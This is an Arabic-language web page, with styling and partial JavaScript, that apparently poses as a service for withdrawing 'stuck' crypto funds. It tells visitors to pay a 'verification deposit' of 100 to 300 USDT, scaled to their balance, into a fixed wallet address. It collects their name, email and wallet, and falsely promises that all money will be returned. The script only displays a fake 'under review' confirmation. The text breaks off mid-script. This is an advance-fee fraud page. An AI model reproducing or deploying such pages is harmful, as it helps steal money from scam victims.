<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>إيداع التحقق - سحب الأموال العالقة</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
:root{
  --bg-gradient: linear-gradient(135deg,#0f2027,#203a43);
  --accent:#f1c40f;
  --card-bg:rgba(255,255,255,0.05);
  --input-bg:rgba(255,255,255,0.15);
  --btn-primary:#f1c40f;
  --btn-ghost:#fff;
  --text-muted:rgba(255,255,255,0.7);
}
body{
  margin:0;
  font-family:'Tajawal', sans-serif;
  background: var(--bg-gradient);
  color:#fff;
  direction:rtl;
  overflow-x:hidden;
}
.container{
  max-width:700px;
  margin:20px auto;
  padding:10px;
}
.brand{
  color:var(--accent);
  font-weight:700;
  font-size:24px;
  margin-bottom:15px;
  text-align:center;
  position:relative;
}
.card{
  background:var(--card-bg);
  padding:25px;
  border-radius:15px;
  box-shadow:0 10px 30px rgba(0,0,0,0.6);
  margin-bottom:20px;
}
h3,h4{
  margin:0 0 10px 0;
}
.muted{
  color:var(--text-muted);
  font-size:14px;
}
input[type="text"], input[type="number"], input[type="file"]{
  width:100%;
  padding:10px;
  border-radius:6px;
  border:none;
  margin-top:6px;
  background:var(--input-bg);
  color:#fff;
}
input::placeholder{color:var(--text-muted);}
.btn{
  cursor:pointer;
  padding:10px 16px;
  border:none;
  border-radius:8px;
  font-size:15px;
  font-weight:600;
  transition:0.2s;
  margin-top:8px;
}
.btn:hover{opacity:0.9;}
.btn-primary{background:var(--btn-primary); color:#000;}
.btn-ghost{background:transparent; color:#fff; border:1px solid #fff;}
.proof-name{margin-top:6px; font-size:13px; color:var(--accent);}
.footer-note{
  text-align:center;
  margin-top:20px;
  color:var(--text-muted);
  font-size:13px;
}
.alert-note{
  background:rgba(255,255,255,0.08);
  padding:12px;
  border-left:4px solid var(--accent);
  font-size:14px;
  margin:10px 0;
  border-radius:6px;
}
/* زر مشاركة التطبيق عائم */
#share-btn{
  position:fixed;
  bottom:20px;
  right:20px;
  background:var(--accent);
  color:#000;
  padding:12px 16px;
  border-radius:50px;
  font-weight:700;
  cursor:pointer;
  box-shadow:0 6px 20px rgba(0,0,0,0.5);
  display:flex;
  align-items:center;
  gap:6px;
  z-index:9999;
}
/* شريط دعوة الأصدقاء متحرك */
#invite-bar{
  width:100%;
  overflow:hidden;
  background:rgba(0,0,0,0.2);
  border-radius:8px;
  padding:6px 0;
  margin-bottom:20px;
  position:relative;
}
#invite-bar p{
  display:inline-block;
  white-space:nowrap;
  position:absolute;
  will-change:transform;
  animation:scroll-left 10s linear infinite;
  margin:0;
  padding-left:100%;
}
@keyframes scroll-left{
  0%{transform:translateX(100%);}
  100%{transform:translateX(-100%);}
}
</style>
</head>
<body>

<!-- شريط دعوة الأصدقاء -->
<div id="invite-bar">
  <p>ادعُ أصدقائك لتحصل على خصم 10$ لكل شخص ينضم!</p>
</div>

<div class="container">
  <div class="brand">أهلاً بكم بإيداع التحقق وسحب الأموال العالقة</div>

  <!-- خانة إيداع التحقق -->
  <div class="card">
    <h3>تحقق مبلغ الإيداع</h3>
    <input id="verify-deposit-amount" type="number" placeholder="أدخل مبلغك الحالي"/>
    <button class="btn btn-primary" onclick="checkDeposit()">تحقق</button>
    <p id="deposit-verify-msg" class="muted"></p>

    <h4>رفع إثبات الإيداع</h4>
    <input id="proof-file" type="file" accept="image/*"/>
    <div id="proof-file-name" class="proof-name"></div>
    <button class="btn btn-primary" onclick="submitVerificationDeposit()">إرسال إثبات & طلب التحقق</button>
  </div>

  <!-- خانة طلب السحب -->
  <div class="card">
    <h3>طلب سحب الأموال</h3>
    <div class="alert-note">⚠️ قبل طلب السحب، يجب رفع صورة للأموال العالقة</div>

    <!-- المحفظة الخاصة بك في الأعلى -->
    <label>محفظتي (USDT BEP20)</label>
    <input id="my-wallet" value="0x3932890a5d1acb3ab036bd39ade26c47929b37e5" readonly/>
    <button class="btn btn-primary" onclick="copyMyWallet()">نسخ المحفظة</button>

    <label>الاسم على المنصة</label>
    <input id="user-name" placeholder="أدخل اسمك"/>

    <label>كود الدعوة</label>
    <input id="ref-code" placeholder="كود الدعوة"/>

    <label>البريد الإلكتروني</label>
    <input id="user-email" type="text" placeholder="البريد الإلكتروني"/>

    <label>المبلغ المراد سحبه (USDT)</label>
    <input id="withdraw-amount" type="number" placeholder="أدخل المبلغ"/>

    <label>محفظتك لاستلام السحب (USDT BEP20)</label>
    <input id="withdraw-target-wallet" placeholder="عنوان محفظتك"/>

    <label>رفع صورة الأموال العالقة</label>
    <input id="locked-funds-file" type="file" accept="image/*"/>
    <div id="locked-file-name" class="proof-name"></div>

    <button class="btn btn-primary" onclick="requestWithdraw()">طلب السحب</button>
    <p id="withdraw-msg" class="muted"></p>
  </div>

  <div class="footer-note">
    ملاحظة: جميع الأموال سوف تعود لك عند اكتمال طلب الإيداع والسحب
  </div>
</div>

<!-- زر مشاركة التطبيق عائم -->
<div id="share-btn" onclick="shareApp()"><i class="fas fa-share"></i> شارك التطبيق</div>

<script>
document.getElementById('proof-file').addEventListener('change', e=>{
  const f = e.target.files[0];
  document.getElementById('proof-file-name').innerText = f ? `ملف مرفوع: ${f.name}` : '';
});
document.getElementById('locked-funds-file').addEventListener('change', e=>{
  const f = e.target.files[0];
  document.getElementById('locked-file-name').innerText = f ? `ملف مرفوع: ${f.name}` : '';
});

function checkDeposit(){
  const amt = parseFloat(document.getElementById('verify-deposit-amount').value);
  const msg = document.getElementById('deposit-verify-msg');
  if(isNaN(amt) || amt<=0){ msg.innerText='يرجى إدخال مبلغ صالح'; return;}
  if(amt<=500) msg.innerText='يجب الإيداع: 100 USDT';
  else if(amt>=1000 && amt<2000) msg.innerText='يجب الإيداع: 200 USDT';
  else if(amt>=2000) msg.innerText='يجب الإيداع: 300 USDT';
  else msg.innerText='المبلغ مقبول';
}

function submitVerificationDeposit(){
  const file = document.getElementById('proof-file').files[0];
  const amt = parseFloat(document.getElementById('verify-deposit-amount').value);
  if(isNaN(amt)||amt<=0){alert('أدخل المبلغ'); return;}
  if(!file){alert('يرجى إرفاق إثبات الدفع'); return;}
  alert(`تم إرسال طلب التحقق لمبلغ ${amt} USDT بنجاح، قيد المراجعة.`);
}
